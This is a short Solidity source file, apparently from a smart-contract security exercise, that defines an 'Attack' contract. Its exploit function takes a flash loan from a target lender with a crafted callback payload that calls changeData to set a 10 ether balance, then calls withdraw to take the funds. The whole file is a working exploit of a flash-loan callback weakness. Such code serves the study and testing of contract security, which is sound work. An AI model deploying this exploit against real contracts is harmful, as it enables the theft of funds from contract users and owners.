// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "hardhat/console.sol";

interface ILender{
        function flashLoan(address borrower,bytes calldata data) external;
        function withdraw(uint256 _amount) external;
}

contract Attack {
    using Address for address;
    using SafeERC20 for IERC20;
    IERC20 public token;
    mapping(address => uint) public balances;
    bool private _flashLoan;

    function exploit(address contractAddress) external{
        ILender lenderContract = ILender(contractAddress);
        uint256 param1 = 10 ether;
        bytes memory executePayload = abi.encodeWithSignature("changeData(uint256)", param1);
        console.log(contractAddress);
        console.log(address(this));
        console.log(param1);
        lenderContract.flashLoan(address(this),executePayload);
        lenderContract.withdraw(10 ether);
    }

    function changeData(uint256 _amount) external{
        balances[msg.sender]=_amount;
        console.log("bal chg=",msg.sender,balances[address(this)]);
    }

}